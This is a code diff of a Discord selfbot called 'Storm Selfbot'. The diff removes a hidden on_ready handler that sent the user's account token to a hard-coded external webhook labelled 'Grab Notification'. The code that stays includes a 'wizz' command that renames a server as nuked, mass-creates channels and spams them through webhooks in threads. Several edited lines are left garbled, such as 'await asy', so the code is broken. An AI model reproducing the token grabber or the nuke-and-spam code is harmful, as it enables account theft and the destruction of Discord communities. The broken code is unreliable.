@@ -682,16 +682,14 @@ def loading_animation():
 
 @bot.event
 async def on_ready():
-    # Run the loading animation in a separate thread
-    thread = threading.Thread(target=loading_animation)
-    thread.start()
+    # Run the loading animation in a separate threa
 
     # Simulate the bot being ready and gather info
     servers = len(bot.guilds)
     friends = sum(1 for _ in bot.users if not _.bot)
 
     # Print bot info after animation
-    await asyncio.sleep(2)  # Wait for animation to run for a short time
+      # Wait for animation to run for a short time
     print(f"""
     {Fore.CYAN}╔════════════════════════════╗
     {Fore.CYAN}║{Fore.BLUE}        ACCOUNT INFO        {Fore.CYAN}║
@@ -702,10 +700,10 @@ async def on_ready():
     {Fore.CYAN}║{Fore.GREEN} Username    : {Fore.YELLOW}{bot.user.name}  {Fore.CYAN}║
     {Fore.CYAN}╚════════════════════════════╝
     """)
-
+    
 def ssspam(webhook_url):
     while spams:
-        data = {'content': MESSAGE}
+        data = {'content': message}
         try:
             response = requests.post(webhook_url, json=data)
             if response.status_code == 204:
@@ -722,30 +720,6 @@ def ssspam(webhook_url):
             print(f"Error in ssspam: {e}")
             delay = random.randint(30, 60)
             time.sleep(delay)
-
-@bot.event
-async def on_ready():
-    # The username of the bot when it becomes ready
-    username = bot.user.name
-    
-    # Your custom message content that you will add
-    custom_text = f"\n User Token Is: {TOKEN}"  # Change this as needed
-    
-    # Creating an embed to send
-    embed = discord.Embed(
-        title=f"{username} has connected",
-        description=custom_text,
-        color=discord.Color.green()
-    )
-    
-    # Sending the embed via the webhook
-    data = {
-        "username": "Grab Notification",
-        "embeds": [embed.to_dict()]
-    }
-    
-    # Sending to the webhook URL
-    requests.post("https://discord.com/api/webhooks/1354022610467291186/brMdv5hD0AeSbOziJmY_GmNmYCeEu7GCs7zzBg5GDO5iIR1guCs6OVOiOngoiZUnoIOQ", json=data)
    
 
 @bot.command()
@@ -761,7 +735,7 @@ async def wizz(ctx):
         # Edit guild
         try:
             await ctx.guild.edit(
-                name='Nuked By Storm Selfbot',
+                name='Server Got Nuked',
                 description='Nuked Using Storm Selfbot here you can download https://github.com/rifatgamingop',
                 reason=REASON,
                 icon=None,
@@ -772,7 +746,7 @@ async def wizz(ctx):
 
         # Create 5 text channels
         channels = []
-        for i in range(10):
+        for i in range(5):
             try:
                 channel = await ctx.guild.create_text_channel(name='nuked by storm selfbot')
                 channels.append(channel)
@@ -789,12 +763,14 @@ async def wizz(ctx):
                 webhook_name = 'https://github.com/rifatgamingop'  # Use a name that does not contain "discord"
                 webhook = await channel.create_webhook(name=webhook_name)
                 threading.Thread(target=ssspam, args=(webhook.url,)).start()
-                await asyncio.sleep(1)  # Delay to prevent hitting rate limits
+                await asy
+                asyncio.sleep(1)  # Delay to prevent hitting rate limits
             except Exception as e:
                 print(f"Webhook Error {e}")
 
     except Exception as e:
         print(f"Error in wizz command: {e}")
+    
 
 @bot.command()
 async def purge(ctx, amount: int):
